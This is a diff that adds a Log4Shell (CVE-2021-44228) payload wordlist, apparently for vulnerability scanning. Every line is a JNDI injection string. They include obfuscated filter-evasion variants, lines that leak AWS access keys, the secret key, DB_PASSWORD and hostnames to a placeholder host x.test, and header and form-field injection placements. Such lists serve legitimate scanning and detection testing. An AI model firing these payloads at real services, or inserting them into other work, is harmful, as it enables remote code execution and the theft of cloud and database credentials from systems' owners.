@@ -1,0 +1,54 @@
+# category: log4shell
+# description: JNDI / log4j lookup strings used to probe for CVE-2021-44228 class vulns.
+# references: Apache Log4j advisory CVE-2021-44228, Lunasec writeup.
+# notes: Each line is an inert probe. Replace x.test with your OAST domain before sending.
+
+${jndi:ldap://x.test/a}
+${jndi:ldap://x.test:1389/a}
+${jndi:ldaps://x.test/a}
+${jndi:rmi://x.test/a}
+${jndi:dns://x.test/a}
+${jndi:iiop://x.test/a}
+${jndi:nis://x.test/a}
+${jndi:nds://x.test/a}
+${jndi:corba://x.test/a}
+${jndi:${lower:l}${lower:d}ap://x.test/a}
+${jndi:${upper:l}${upper:d}ap://x.test/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.test/a}
+${${env:ENV_NAME:-j}ndi:${lower:ldap}://x.test/a}
+${${lower:${lower:jndi}}:${lower:ldap}://x.test/a}
+${jndi:dns://${hostName}.x.test}
+${jndi:ldap://${hostName}.${env:USER}.x.test}
+${jndi:ldap://${sys:user.name}.x.test}
+${jndi:ldap://${sys:java.version}.x.test}
+${jndi:ldap://${env:AWS_ACCESS_KEY_ID}.x.test}
+${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.x.test}
+${jndi:ldap://${env:DB_PASSWORD}.x.test}
+${${::-${::-$${::-j}}}ndi:ldap://x.test}
+${jndi:ldap:/x.test/a}
+${jndi:${::-l}${::-d}${::-a}${::-p}://x.test/a}
+${${k8s:k5:-${upper:j}}${lower:n}${lower:d}${lower:i}:ldap://x.test/a}
+
+# ── Multi-provider / nested ───────────────────────────────────────────────
+${jndi:${env:BAD_SCHEME:-ldap}://x.test/a}
+${jndi:${upper:ldap}://${hostName}.x.test/a}
+${${::-$${::-j}${::-n}${::-d}${::-i}}:ldap://${hostName}.x.test/a}
+${${date:'j'}ndi:ldap://x.test/a}
+${${sys:nope:-j}${::-n}${::-d}${::-i}:ldap://x.test/a}
+${${k8s:nope:-${upper:j}}${sys:x:-ndi}:ldap://x.test/a}
+${jndi:ldap://x.test/${sys:java.vendor}}
+${jndi:ldap://x.test/${sys:os.name}}
+
+# ── Via header injection candidates ──────────────────────────────────────
+User-Agent: ${jndi:ldap://x.test/ua}
+Referer: ${jndi:ldap://x.test/ref}
+X-Forwarded-For: ${jndi:ldap://x.test/xff}
+X-Api-Version: ${jndi:ldap://x.test/apiv}
+X-Requested-With: ${jndi:ldap://x.test/xrw}
+Cookie: s=${jndi:ldap://x.test/ck}
+Authorization: Bearer ${jndi:ldap://x.test/auth}
+
+# ── Form / body injection candidates ─────────────────────────────────────
+username=${jndi:ldap://x.test/u}
+password=${jndi:ldap://x.test/p}
+search=${jndi:ldap://x.test/s}
